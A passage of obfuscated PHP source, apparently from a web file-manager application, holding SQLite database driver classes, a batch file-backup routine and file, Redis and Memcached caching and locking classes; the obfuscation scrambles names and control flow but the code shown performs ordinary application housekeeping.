$BáÁæŒ›Â[29] => $bÌßÏİ¬ˆ–[$BáÁæŒ›Â[30]], $BáÁæŒ›Â[31] => (bool) ($bÌßÏİ¬ˆ–[$BáÁæŒ›Â[32]] === $BáÁæŒ›Â[33]), $BáÁæŒ›Â[34] => $bÌßÏİ¬ˆ–[$BáÁæŒ›Â[35]], $BáÁæŒ›Â[36] => strtolower($bÌßÏİ¬ˆ–[$BáÁæŒ›Â[37]]) == $BáÁæŒ›Â[38], $BáÁæŒ›Â[39] => strtolower($bÌßÏİ¬ˆ–[$BáÁæŒ›Â[40]]) == $BáÁæŒ›Â[41]); } } return $aôˆŠÃ‰Î; } public function getTables($dèÃ‘ïÔÎ¥ = '') { $EÂØÜÂå…› =& $_SERVER[Ïº«‚ßèÔˆø]; $fĞŒèé£§§ = $this->query($EÂØÜÂå…›[42] . $EÂØÜÂå…›[43] . $EÂØÜÂå…›[44]); $aŒ°¬”Ç½Õ = array(); foreach ($fĞŒèé£§§ as $f‰êÙ¸Ò×¦ => $cãøğ¸¶ö) { $aŒ°¬”Ç½Õ[$f‰êÙ¸Ò×¦] = current($cãøğ¸¶ö); } return $aŒ°¬”Ç½Õ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $e•Ë°ÃÒª =& $_SERVER[Ïº«‚ßèÔˆø]; $AîÇ¸ÌùÇÏ = sqlite_last_error($this->_linkID); $this->error = $AîÇ¸ÌùÇÏ . $e•Ë°ÃÒª[4] . sqlite_error_string($AîÇ¸ÌùÇÏ); if ($e•Ë°ÃÒª[33] != $this->queryStr) { $this->error .= LNG($e•Ë°ÃÒª[45]) . $this->queryStr; } think_trace($this->error, $e•Ë°ÃÒª[33], $e•Ë°ÃÒª[46]); return $this->error; } public function escapeString($a¿Š¥•Ï´š) { return sqlite_escape_string($a¿Š¥•Ï´š); } public function parseLimit($B°¥ ãÌ¢) { $b˜Ä¸Œ†ââ =& $_SERVER[Ïº«‚ßèÔˆø]; $cŒåáÈø = $b˜Ä¸Œ†ââ[33]; if (!empty($B°¥ ãÌ¢)) { $B°¥ ãÌ¢ = explode($b˜Ä¸Œ†ââ[47], $B°¥ ãÌ¢); if (count($B°¥ ãÌ¢) > 1) { $cŒåáÈø .= $b˜Ä¸Œ†ââ[48] . $B°¥ ãÌ¢[1] . $b˜Ä¸Œ†ââ[49] . $B°¥ ãÌ¢[0] . $b˜Ä¸Œ†ââ[50]; } else { $cŒåáÈø .= $b˜Ä¸Œ†ââ[48] . $B°¥ ãÌ¢[0] . $b˜Ä¸Œ†ââ[50]; } } return $cŒåáÈø; } } class DbSqlite3Base extends Db { public function __construct($bÜà‚»ã©‰ = '') { $Cèí÷¸¿Ë =& $_SERVER[Ïº«‚ßèÔˆø]; if (!class_exists($Cèí÷¸¿Ë[51])) { think_exception(think_lang($Cèí÷¸¿Ë[10]) . $Cèí÷¸¿Ë[52]); } if (!empty($bÜà‚»ã©‰)) { if (!isset($bÜà‚»ã©‰[$Cèí÷¸¿Ë[12]])) { $bÜà‚»ã©‰[$Cèí÷¸¿Ë[12]] = 438; } $this->config = $bÜà‚»ã©‰; if (empty($this->config[$Cèí÷¸¿Ë[13]])) { $this->config[$Cèí÷¸¿Ë[13]] = array(); } } } public function connect($f¤˜åñÏ±½ = '', $aëîèÕ˜® = 0) { $e©¼äÑ›«á =& $_SERVER[Ïº«‚ßèÔˆø]; if (!isset($this->linkID[$aëîèÕ˜®])) { if (empty($f¤˜åñÏ±½)) { $f¤˜åñÏ±½ = $this->config; } $this->linkID[$aëîèÕ˜®] = new SQLite3($f¤˜åñÏ±½[$e©¼äÑ›«á[17]]); if (!$this->linkID[$aëîèÕ˜®]) { think_exception($this->linkID[$aëîèÕ˜®]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$aëîèÕ˜®]->busyTimeout(30000); if (1 != think_config($e©¼äÑ›«á[18])) { unset($this->config); } } return $this->linkID[$aëîèÕ˜®]; } public function free() { $this->queryID = null; } public function query($aÁ•Û¥ˆº) { goto cÜ‡¹Š£‘î; cÜ‡¹Š£‘î: $D¶­Ñø¡±è =& $_SERVER[Ïº«‚ßèÔˆø]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto FÖ‡»„Ûçñ; B‰¥ÁÓÎ: think_status($D¶­Ñø¡±è[20]); $this->queryID = $this->_linkID->query($aÁ•Û¥ˆº); $this->debug(); goto CŠåÁÍ•Ä¾; FÖ‡»„Ûçñ: $this->queryStr = $aÁ•Û¥ˆº; if ($this->queryID) { $this->free(); } think_action_status($D¶­Ñø¡±è[19], 1); goto B‰¥ÁÓÎ; CŠåÁÍ•Ä¾: if (!1 === $this->queryID) { $this->error(); return !1; } else { $e¨éªµƒ•Æ = $this->getAll(); $this->numRows = count($e¨éªµƒ•Æ); return $e¨éªµƒ•Æ; } goto cì¥ ‚¼; cì¥ ‚¼: } public function execute($AÓÒù§¡à) { goto cÓÊ¤¤ŠÖ¾; côº—ëŞ‚±: $this->queryStr = $AÓÒù§¡à; if ($this->queryID) { $this->free(); } think_action_status($båßĞÒê [21], 1); goto d½³Ÿ»„Ì; dê‰•©Æùˆ: if (!1 === $açôŒáìÂ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto Ağ™­æ¶Œğ; d½³Ÿ»„Ì: think_status($båßĞÒê [20]); $açôŒáìÂ = $this->_linkID->exec($AÓÒù§¡à); $this->debug(); goto dê‰•©Æùˆ; cÓÊ¤¤ŠÖ¾: $båßĞÒê  =& $_SERVER[Ïº«‚ßèÔˆø]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto côº—ëŞ‚±; Ağ™­æ¶Œğ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[Ïº«‚ßèÔˆø][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $f¾íµÒª = $this->_linkID->query($_SERVER[Ïº«‚ßèÔˆø][23]); if (!$f¾íµÒª) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $FÚ†…„Ï”ã = $this->_linkID->query($_SERVER[Ïº«‚ßèÔˆø][24]); if (!$FÚ†…„Ï”ã) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $D’’¥‘í™ = array(); while ($bÛÒõÜ¶È² = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $D’’¥‘í™[] = $bÛÒõÜ¶È²; } $this->queryID->reset(); return $D’’¥‘í™; } public function getFields($Föõ ÷¸ºë) { $fÏ½»ôÅ“ =& $_SERVER[Ïº«‚ßèÔˆø]; $DÌÔ–ğ¿§¯ = $this->query($fÏ½»ôÅ“[25] . $Föõ ÷¸ºë . $fÏ½»ôÅ“[26]); $C¬áòÉ»Éì = array(); if ($DÌÔ–ğ¿§¯) { foreach ($DÌÔ–ğ¿§¯ as $aßßáöÇë‚ => $B†„ƒÅåŞö) { $C¬áòÉ»Éì[$B†„ƒÅåŞö[$fÏ½»ôÅ“[28]]] = array($fÏ½»ôÅ“[28] => $B†„ƒÅåŞö[$fÏ½»ôÅ“[28]], $fÏ½»ôÅ“[29] => $B†„ƒÅåŞö[$fÏ½»ôÅ“[29]], $fÏ½»ôÅ“[31] => (bool) ($B†„ƒÅåŞö[$fÏ½»ôÅ“[31]] === $fÏ½»ôÅ“[33]), $fÏ½»ôÅ“[34] => $B†„ƒÅåŞö[$fÏ½»ôÅ“[53]], $fÏ½»ôÅ“[36] => (bool) $B†„ƒÅåŞö[$fÏ½»ôÅ“[54]], $fÏ½»ôÅ“[39] => (bool) $B†„ƒÅåŞö[$fÏ½»ôÅ“[54]]); } } return $C¬áòÉ»Éì; } public function getTables($aò«ÄÊºŠ½ = '') { $Dƒğï™º…¢ =& $_SERVER[Ïº«‚ßèÔˆø]; $eø¹…Æ¤ª… = $this->query($Dƒğï™º…¢[42] . $Dƒğï™º…¢[43] . $Dƒğï™º…¢[44]); $b±Ë¢‘‰ó = array(); foreach ($eø¹…Æ¤ª… as $dŞ§éÈ„— => $Bº¶•”¢Òê) { $b±Ë¢‘‰ó[$dŞ§éÈ„—] = current($Bº¶•”¢Òê); } return $b±Ë¢‘‰ó; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $e³¨Ä¼”–ˆ =& $_SERVER[Ïº«‚ßèÔˆø]; $this->error = $this->_linkID->lastErrorMsg(); if ($e³¨Ä¼”–ˆ[33] != $this->queryStr) { $this->error .= LNG($e³¨Ä¼”–ˆ[45]) . $this->queryStr; } think_trace($this->error, $e³¨Ä¼”–ˆ[33], $e³¨Ä¼”–ˆ[46]); return $this->error; } public function escapeString($fæ„ëš•ù®) { $aÒ¦ì°Ä¯Ú =& $_SERVER[Ïº«‚ßèÔˆø]; if ($this->_linkID) { return $this->_linkID->escapeString($fæ„ëš•ù®); } return str_ireplace($aÒ¦ì°Ä¯Ú[55], $aÒ¦ì°Ä¯Ú[56], $fæ„ëš•ù®); } public function parseLimit($E£ÑÑñƒ«›) { $DĞ‡ÅàÜº¿ =& $_SERVER[Ïº«‚ßèÔˆø]; $fë¢‰ç˜‚ = $DĞ‡ÅàÜº¿[33]; if (!empty($E£ÑÑñƒ«›)) { $E£ÑÑñƒ«› = explode($DĞ‡ÅàÜº¿[47], $E£ÑÑñƒ«›); if (count($E£ÑÑñƒ«›) > 1) { $fë¢‰ç˜‚ .= $DĞ‡ÅàÜº¿[48] . $E£ÑÑñƒ«›[1] . $DĞ‡ÅàÜº¿[49] . $E£ÑÑñƒ«›[0] . $DĞ‡ÅàÜº¿[50]; } else { $fë¢‰ç˜‚ .= $DĞ‡ÅàÜº¿[48] . $E£ÑÑñƒ«›[0] . $DĞ‡ÅàÜº¿[50]; } } return $fë¢‰ç˜‚; } } goto dÅ®ÉêÂ³÷; A“‡ ¤Ç¯Ğ: class BackupFile { public function __construct() { } public function index() { goto b¥ÔŸ—Á; Eâ‡àØ”: $aÎÎÄé¬¦ô = !0; $dÏö¯Õ»ÁÛ = $this->storeIds(); $bá‡ğÓ®•· = 1; goto f‹Ê‚¢î×; D¶Å£¾¡ƒ: $AÂâ»îê³› = $b‚ç¿½Ìõå = 0; do { $cŞìó¨¤¾˜ = $_SERVER[Ïº«‚ßèÔˆø][771]; $dÓ‘Ÿ•‡™Ü = Model($_SERVER[Ïº«‚ßèÔˆø][731])->where($C¾í™¢Û‘É)->field($cŞìó¨¤¾˜)->order($_SERVER[Ïº«‚ßèÔˆø][772])->selectPage($cñ”•å¥Ä, $bá‡ğÓ®•·); $Bº’ÕğôË® = !empty($dÓ‘Ÿ•‡™Ü[$_SERVER[Ïº«‚ßèÔˆø][366]]) ? $dÓ‘Ÿ•‡™Ü[$_SERVER[Ïº«‚ßèÔˆø][366]] : array(); foreach ($Bº’ÕğôË® as $c¤˜†é‰÷) { goto DÉ™óé¯‘Š; DÉ™óé¯‘Š: if (!$this->_fileExist($c¤˜†é‰÷, $eÀù‰œÑ›Ò, $dÏö¯Õ»ÁÛ)) { $DİĞÛËÒñ -= 1; $f˜°’¤°à” -= (int) $c¤˜†é‰÷[$_SERVER[Ïº«‚ßèÔˆø][78]]; write_log("\x66\151\154\145\x20\x6e\157\x74\40\x65\170\x69\x73\x74\56\146\x69\x6c\x65\111\104\72{$c¤˜†é‰÷[$_SERVER[Ïº«‚ßèÔˆø][445]]}\54\40\x70\141\x74\x68\72{$c¤˜†é‰÷[$_SERVER[Ïº«‚ßèÔˆø][76]]}", $_SERVER[Ïº«‚ßèÔˆø][773]); continue; } $fí×‡à = $c¤˜†é‰÷[$_SERVER[Ïº«‚ßèÔˆø][76]]; $dŞ±âÏ‹¼Ë = "\x7b\x69\x6f\72{$BºˆÎ³½Ğ‡[$_SERVER[Ïº«‚ßèÔˆø][699]]}\x7d" . substr($fí×‡à, strlen("\173\x69\x6f\72{$c¤˜†é‰÷[$_SERVER[Ïº«‚ßèÔˆø][774]]}\175")); goto a™¨ë––; aïå³É¿›: $aïÂìˆ¶ÎÆ += $c¤˜†é‰÷[$_SERVER[Ïº«‚ßèÔˆø][78]]; $b‚ç¿½Ìõå += 1; $AÂâ»îê³› += $c¤˜†é‰÷[$_SERVER[Ïº«‚ßèÔˆø][78]]; goto dÕñĞä×Ò; dÕñĞä×Ò: if ($aïÂìˆ¶ÎÆ >= 1024 * 1024 * 100) { $B¢‹«ÅĞÎğ = array($_SERVER[Ïº«‚ßèÔˆø][777] => $A¡‚‘ˆ©åæ, $_SERVER[Ïº«‚ßèÔˆø][778] => $b‚ç¿½Ìõå, $_SERVER[Ïº«‚ßèÔˆø][779] => $AÂâ»îê³›); Backup::set($B¢‹«ÅĞÎğ); $aïÂìˆ¶ÎÆ = $aƒó¦èŠïŸ = 0; } goto bÚÃ²öš»¹; a™¨ë––: if (IO::exist($dŞ±âÏ‹¼Ë)) { $A‹Ú®ŠŸË->updateFileEnd($c¤˜†é‰÷[$_SERVER[Ïº«‚ßèÔˆø][28]], $c¤˜†é‰÷[$_SERVER[Ïº«‚ßèÔˆø][78]]); } else { $dŞ±âÏ‹¼Ë = get_path_father($dŞ±âÏ‹¼Ë); IO::mkdir($dŞ±âÏ‹¼Ë); if (!IO::copy($fí×‡à, $dŞ±âÏ‹¼Ë, $_SERVER[Ïº«‚ßèÔˆø][775])) { write_log($_SERVER[Ïº«‚ßèÔˆø][776] . $fí×‡à . $_SERVER[Ïº«‚ßèÔˆø][759] . $dŞ±âÏ‹¼Ë . $_SERVER[Ïº«‚ßèÔˆø][503], $_SERVER[Ïº«‚ßèÔˆø][726]); $aÎÎÄé¬¦ô = !1; break; } } $A¡‚‘ˆ©åæ = $c¤˜†é‰÷[$_SERVER[Ïº«‚ßèÔˆø][445]]; $aƒó¦èŠïŸ += 1; goto aïå³É¿›; bÚÃ²öš»¹: } $fºØ÷È‚×ø = count($Bº’ÕğôË®); $bá‡ğÓ®•·++; } while ($fºØ÷È‚×ø == $cñ”•å¥Ä); $A‹Ú®ŠŸË->end(); goto a¸œÏØÌªÀ; a¸œÏØÌªÀ: $B¢‹«ÅĞÎğ = array($_SERVER[Ïº«‚ßèÔˆø][780] => 1, $_SERVER[Ïº«‚ßèÔˆø][474] => time(), $_SERVER[Ïº«‚ßèÔˆø][719] => 1, $_SERVER[Ïº«‚ßèÔˆø][777] => $A¡‚‘ˆ©åæ, $_SERVER[Ïº«‚ßèÔˆø][769] => $f˜°’¤°à”, $_SERVER[Ïº«‚ßèÔˆø][768] => $DİĞÛËÒñ, $_SERVER[Ïº«‚ßèÔˆø][781] => time()); if ($aƒó¦èŠïŸ) { $B¢‹«ÅĞÎğ[$_SERVER[Ïº«‚ßèÔˆø][778]] = $b‚ç¿½Ìõå; $B¢‹«ÅĞÎğ[$_SERVER[Ïº«‚ßèÔˆø][779]] = $AÂâ»îê³›; } Backup::set($B¢‹«ÅĞÎğ); goto E¡ªŠæ†åÃ; E¡ªŠæ†åÃ: $this->_fileFilter($eÀù‰œÑ›Ò); return !0; goto D£Üìíî•Å; cóªî¼õ·²: $A‹Ú®ŠŸË->task[$_SERVER[Ïº«‚ßèÔˆø][707]] = $f˜°’¤°à”; $B¢‹«ÅĞÎğ = array($_SERVER[Ïº«‚ßèÔˆø][768] => $DİĞÛËÒñ, $_SERVER[Ïº«‚ßèÔˆø][769] => $f˜°’¤°à”, $_SERVER[Ïº«‚ßèÔˆø][770] => time()); Backup::set($B¢‹«ÅĞÎğ); goto Eâ‡àØ”; b¥ÔŸ—Á: $BºˆÎ³½Ğ‡ = Backup::get(); $A¡‚‘ˆ©åæ = $BºˆÎ³½Ğ‡[$_SERVER[Ïº«‚ßèÔˆø][290]][$_SERVER[Ïº«‚ßèÔˆø][192]][$_SERVER[Ïº«‚ßèÔˆø][445]]; $C¾í™¢Û‘É = array($_SERVER[Ïº«‚ßèÔˆø][446] => array($_SERVER[Ïº«‚ßèÔˆø][764], $A¡‚‘ˆ©åæ), $_SERVER[Ïº«‚ßèÔˆø][765] => array($_SERVER[Ïº«‚ßèÔˆø][328], $BºˆÎ³½Ğ‡[$_SERVER[Ïº«‚ßèÔˆø][699]])); goto fÎˆ¤®®Ç; fÎˆ¤®®Ç: $DİĞÛËÒñ = (int) Model($_SERVER[Ïº«‚ßèÔˆø][731])->where($C¾í™¢Û‘É)->count($_SERVER[Ïº«‚ßèÔˆø][445]); $f˜°’¤°à” = (int) Model($_SERVER[Ïº«‚ßèÔˆø][731])->where($C¾í™¢Û‘É)->sum($_SERVER[Ïº«‚ßèÔˆø][78]); $A‹Ú®ŠŸË = new TaskFileTransfer($_SERVER[Ïº«‚ßèÔˆø][766], $_SERVER[Ïº«‚ßèÔˆø][726], $DİĞÛËÒñ, LNG($_SERVER[Ïº«‚ßèÔˆø][727]) . $_SERVER[Ïº«‚ßèÔˆø][728] . LNG($_SERVER[Ïº«‚ßèÔˆø][767])); goto cóªî¼õ·²; f‹Ê‚¢î×: $cñ”•å¥Ä = 1000; $aïÂìˆ¶ÎÆ = $aƒó¦èŠïŸ = 0; $eÀù‰œÑ›Ò = array(); goto D¶Å£¾¡ƒ; D£Üìíî•Å: } private function _fileExist($Dê¬¦·ß, &$dÎ‘Íè†‹, $e¢Æšöô) { goto Fƒƒö¦ñËÍ; Fƒƒö¦ñËÍ: $dÔ°‡˜…Ğ’ =& $_SERVER[Ïº«‚ßèÔˆø]; $E†ôªÏ¹ˆ¤ = $Dê¬¦·ß[$dÔ°‡˜…Ğ’[76]]; if (in_array($Dê¬¦·ß[$dÔ°‡˜…Ğ’[445]], $dÎ‘Íè†‹)) { return !1; } goto C×—µßö„¼; cÆŒ«Ò˜ÊÚ: if (IO::exist($e¬Âê‚‰‰)) { $dÎ‘Íè†‹[] = $Dê¬¦·ß[$dÔ°‡˜…Ğ’[445]]; return !1; } $C¼©ŒÜë = array($dÔ°‡˜…Ğ’[774] => $Dê¬¦·ß[$dÔ°‡˜…Ğ’[774]], $dÔ°‡˜…Ğ’[76] => array($dÔ°‡˜…Ğ’[379], "{$e¬Âê‚‰‰}\x25")); $cˆ“¼­Õ‹š = Model($dÔ°‡˜…Ğ’[731])->where($C¼©ŒÜë)->field($dÔ°‡˜…Ğ’[446])->select(); goto DÜ¼Æ·¸Æø; DÜ¼Æ·¸Æø: $dÎ‘Íè†‹ = array_merge($dÎ‘Íè†‹, array_to_keyvalue($cˆ“¼­Õ‹š, $dÔ°‡˜…Ğ’[33], $dÔ°‡˜…Ğ’[445])); return !1; goto B™„†ğ‡åÒ; C×—µßö„¼: if (!in_array($Dê¬¦·ß[$dÔ°‡˜…Ğ’[774]], $e¢Æšöô)) { return !1; } if (IO::exist($E†ôªÏ¹ˆ¤)) { return !0; } $e¬Âê‚‰‰ = get_path_father($E†ôªÏ¹ˆ¤); goto cÆŒ«Ò˜ÊÚ; B™„†ğ‡åÒ: } private function _fileFilter($f‡Úô–ä¨à) { $D»ƒ•øÏÈ¹ =& $_SERVER[Ïº«‚ßèÔˆø]; if (empty($f‡Úô–ä¨à)) { return; } $D±Ô×Àœ­ = array($D»ƒ•øÏÈ¹[445] => array($D»ƒ•øÏÈ¹[7], array_unique($f‡Úô–ä¨à))); $e…§ğ¨´” = Model($D»ƒ•øÏÈ¹[782])->where($D±Ô×Àœ­)->field($D»ƒ•øÏÈ¹[394])->select(); foreach ($e…§ğ¨´” as $Cš¾‘¹¦Ñó) { Model($D»ƒ•øÏÈ¹[782])->remove($Cš¾‘¹¦Ñó[$D»ƒ•øÏÈ¹[394]], !1); } } private function storeIds() { $E”‹·Ééö =& $_SERVER[Ïº«‚ßèÔˆø]; $F¦Š¬¥½ˆ = Model($E”‹·Ééö[711])->listData(); $fˆ—‚Úª = array(); $B±Öó™’ÊÛ = $GLOBALS[$E”‹·Ééö[6]][$E”‹·Ééö[88]][$E”‹·Ééö[783]]; foreach ($F¦Š¬¥½ˆ as $C˜µ ì„·—) { $a¦‚¼è£Ñ = strtolower($C˜µ ì„·—[$E”‹·Ééö[94]]); if (!isset($B±Öó™’ÊÛ[$a¦‚¼è£Ñ])) { continue; } $CíÅÁåÄ‰ = $E”‹·Ééö[72] . (isset($B±Öó™’ÊÛ[$a¦‚¼è£Ñ]) ? $B±Öó™’ÊÛ[$a¦‚¼è£Ñ] : ucfirst($a¦‚¼è£Ñ)); if (!class_exists($CíÅÁåÄ‰)) { continue; } $fˆ—‚Úª[] = $C˜µ ì„·—[$E”‹·Ééö[392]]; } return $fˆ—‚Úª; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto d¿ÔİÏ­‚; d¿ÔİÏ­‚: $B…ŒÌ›‹«Î =& $_SERVER[Ïº«‚ßèÔˆø]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto F‡‹‰ĞğÕ; F‡‹‰ĞğÕ: $cæœ½©¼Û = $GLOBALS[$B…ŒÌ›‹«Î[6]][$B…ŒÌ›‹«Î[346]]; $f—à†„„¥– = $cæœ½©¼Û[$cæœ½©¼Û[$B…ŒÌ›‹«Î[784]]]; $bÈ‘Ïá«Ã¦ = $cæœ½©¼Û[$B…ŒÌ›‹«Î[785]]; goto a¢¤òğİ÷; a¢¤òğİ÷: switch ($cæœ½©¼Û[$B…ŒÌ›‹«Î[784]]) { case $B…ŒÌ›‹«Î[17]: self::$handle = Model($B…ŒÌ›‹«Î[786]); break; case $B…ŒÌ›‹«Î[787]: self::$handle = new CacheRedis($f—à†„„¥–, $bÈ‘Ïá«Ã¦); break; case $B…ŒÌ›‹«Î[788]: self::$handle = new CacheMemcached($f—à†„„¥–, $bÈ‘Ïá«Ã¦); break; case $B…ŒÌ›‹«Î[192]: self::$handle = new CacheFile($f—à†„„¥–, $bÈ‘Ïá«Ã¦); break; default: break; } return self::$handle; goto EÊ©å‡õÌ‘; EÊ©å‡õÌ‘: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($dªä¼ëêÉÏ) { if (is_array($dªä¼ëêÉÏ) || is_object($dªä¼ëêÉÏ)) { $dªä¼ëêÉÏ = json_encode($dªä¼ëêÉÏ); } $dªä¼ëêÉÏ = rawurlencode($dªä¼ëêÉÏ); return md5(KOD_SITE_ID . $_SERVER[Ïº«‚ßèÔˆø][71] . $dªä¼ëêÉÏ); } public static function get($bÌÆÊºÎ±, $cäš£´ØšÂ = false) { $bß¢˜»Ëç¿ = self::key($bÌÆÊºÎ±); if ($cäš£´ØšÂ) { return unserialize(self::init()->get($bß¢˜»Ëç¿)); } if (!isset(self::$memoryCache[$bß¢˜»Ëç¿])) { $c¨ÁÖ ±¯ç = self::init()->get($bß¢˜»Ëç¿); self::$memoryCache[$bß¢˜»Ëç¿] = unserialize($c¨ÁÖ ±¯ç); } return self::$memoryCache[$bß¢˜»Ëç¿]; } public static function set($AØÛ‘çõ‰…, $B‹øµ¥®É—, $d¥á£ Úğ¦ = false) { goto E‘î’¸Ñ¿”; eË¹‰Ğç­á: CacheLock::unlock($AØÛ‘çõ‰…); return $EŞË„´Ø­ù; goto DæÎÇé‚ë; fçëÕ¾à: CacheLock::lock($AØÛ‘çõ‰…); $EŞË„´Ø­ù = self::init()->set($F…Ô—Æ÷ã­, serialize($B‹øµ¥®É—), $d¥á£ Úğ¦); self::$memoryCache[$F…Ô—Æ÷ã­] = $B‹øµ¥®É—; goto eË¹‰Ğç­á; E‘î’¸Ñ¿”: $F…Ô—Æ÷ã­ = self::key($AØÛ‘çõ‰…); if (isset(self::$memoryCache[$F…Ô—Æ÷ã­]) && self::$memoryCache[$F…Ô—Æ÷ã­] === $B‹øµ¥®É—) { return !0; } if ($d¥á£ Úğ¦ === 0) { self::$memoryCache[$F…Ô—Æ÷ã­] = $B‹øµ¥®É—; return !0; } goto fçëÕ¾à; DæÎÇé‚ë: } public static function getCall($fáÆĞÙæÁ‚, $d™£ºğŞ•¯, $b°ãâˆª–ó, $d´®“ Ïˆê = array()) { $A‘Úç÷¥ = self::get($fáÆĞÙæÁ‚); if ($A‘Úç÷¥) { return $A‘Úç÷¥; } $A‘Úç÷¥ = call_user_func_array($b°ãâˆª–ó, $d´®“ Ïˆê); self::set($fáÆĞÙæÁ‚, $A‘Úç÷¥, $d™£ºğŞ•¯); return $A‘Úç÷¥; } public static function remove($fÖ©Œ¨¯œ) { goto AÖš¾™î­; BÔ·”“Á: return $Bè½ğ”Æø; goto e‚«‘óŒŒŸ; C´ëñ³óØ: CacheLock::lock($fÖ©Œ¨¯œ); $Bè½ğ”Æø = self::init()->remove($e¡Ñ¨ÖÓù); CacheLock::unlock($fÖ©Œ¨¯œ); goto BÔ·”“Á; AÖš¾™î­: $e¡Ñ¨ÖÓù = self::key($fÖ©Œ¨¯œ); unset(self::$memoryCache[$e¡Ñ¨ÖÓù]); self::clearTimeout(); goto C´ëñ³óØ; e‚«‘óŒŒŸ: } public static function removeMemory($a·Œ½Ú–Å«) { $fÎŠÓ–çÌ… = self::key($a·Œ½Ú–Å«); unset(self::$memoryCache[$fÎŠÓ–çÌ…]); } public static function clearMemory($C‘ùêÌ‚« = false) { if ($C‘ùêÌ‚«) { $C‘ùêÌ‚« = self::key($C‘ùêÌ‚«); unset(self::$memoryCache[$C‘ùêÌ‚«]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[Ïº«‚ßèÔˆø][789])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[Ïº«‚ßèÔˆø][790])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($b¨ïª×ø£‡, $eÜ¬”ƒ‚á”) { $D„Œù¾Â§‹ =& $_SERVER[Ïº«‚ßèÔˆø]; $this->cachePath = $b¨ïª×ø£‡[$D„Œù¾Â§‹[76]]; $this->prefix = $D„Œù¾Â§‹[791]; $this->cacheTime = $eÜ¬”ƒ‚á”; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($cé¼¤í§Ö­) { $B×‡äÄ =& $_SERVER[Ïº«‚ßèÔˆø]; $cé¼¤í§Ö­ = str_replace(array($B×‡äÄ[792], $B×‡äÄ[97], $B×‡äÄ[70]), $B×‡äÄ[793], $cé¼¤í§Ö­); return $this->cachePath . $B×‡äÄ[794] . $cé¼¤í§Ö­ . $B×‡äÄ[795]; } public function set($bíİ˜ ì, $C¥ºô•–Éî, $d†‚°†ñİ± = false) { $C‰Çğîğ–÷ = $this->getFile($bíİ˜ ì); if (file_put_contents($C‰Çğîğ–÷, $this->prefix . $C¥ºô•–Éî, LOCK_EX)) { return !0; } @unlink($C‰Çğîğ–÷); return !1; } public function get($bŒ¯´°‡Äù) { $C¢¨Ğì„ªğ = $this->getFile($bŒ¯´°‡Äù); if (file_exists($C¢¨Ğì„ªğ) && filemtime($C¢¨Ğì„ªğ) < time() - $this->cacheTime) { @unlink($C¢¨Ğì„ªğ); return !1; } $cŸ²Ô‹²Õ¹ = @file_get_contents($C¢¨Ğì„ªğ); return substr($cŸ²Ô‹²Õ¹, strlen($this->prefix)); } public function remove($B­ò”‡â‡Ï) { $b†”àµ´¡æ = $this->getFile($B­ò”‡â‡Ï); return @unlink($b†”àµ´¡æ); } public function deleteAll() { $e—¶Íƒİ =& $_SERVER[Ïº«‚ßèÔˆø]; $BÚ…ÒÍöµ¼ = scandir($this->cachePath); foreach ($BÚ…ÒÍöµ¼ as $f·¼Œø“–è) { $Aé‹ ¸İ = $this->cachePath . $f·¼Œø“–è; if (strpos($Aé‹ ¸İ, $e—¶Íƒİ[795]) && strpos($Aé‹ ¸İ, $e—¶Íƒİ[796])) { @unlink($Aé‹ ¸İ); } } } public function clearTimeout() { $fÌ¯ÈÕòÙ =& $_SERVER[Ïº«‚ßèÔˆø]; $F•»İÅ–ÏË = scandir($this->cachePath); foreach ($F•»İÅ–ÏË as $AàòôÊ™ÑÔ) { $b·Ğˆ³ö‘Ş = $this->cachePath . $AàòôÊ™ÑÔ; if (strpos($b·Ğˆ³ö‘Ş, $fÌ¯ÈÕòÙ[795]) && strpos($b·Ğˆ³ö‘Ş, $fÌ¯ÈÕòÙ[796]) && filemtime($b·Ğˆ³ö‘Ş) < time() - $this->cacheTime) { @unlink($b·Ğˆ³ö‘Ş); } } } } goto a×Áí”Ùˆ; F³Ä´¬Á‰œ: class CacheLockRedis { public function lock($CÂ°ÂÇëº™, $AÜ²ößÏ¿ = 10) { $A°ÌíÔ­£Å = Cache::init(); $aªˆ‚“øÛ¶ = microtime(!0) + $AÜ²ößÏ¿; while (microtime(!0) < $aªˆ‚“øÛ¶) { $CŠ¨–›â’ = $A°ÌíÔ­£Å->get($CÂ°ÂÇëº™); if (!$CŠ¨–›â’) { $Då¾ØÄ°Œ» = $A°ÌíÔ­£Å->setLock($CÂ°ÂÇëº™, $aªˆ‚“øÛ¶, $AÜ²ößÏ¿); if ($Då¾ØÄ°Œ») { return !0; } } else { if ($CŠ¨–›â’ < microtime(!0)) { $A°ÌíÔ­£Å->set($CÂ°ÂÇëº™, $aªˆ‚“øÛ¶, $AÜ²ößÏ¿ * 2); if ($A°ÌíÔ­£Å->get($CÂ°ÂÇëº™) === $CŠ¨–›â’) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($B­ôÈøÅøÍ) { return Cache::init()->get($B­ôÈøÅøÍ); } public function unlock($C —Î¥–“Â) { return Cache::init()->remove($C —Î¥–“Â); } } class CacheLockMemcached { public function lock($b­ÄÂÔàß°, $B é¢Œî„Ã = 0) { $dŒÙ¼ÓÇÌ„ = Cache::init(); $f¡ß“ö˜‚ = microtime(!0) + $B 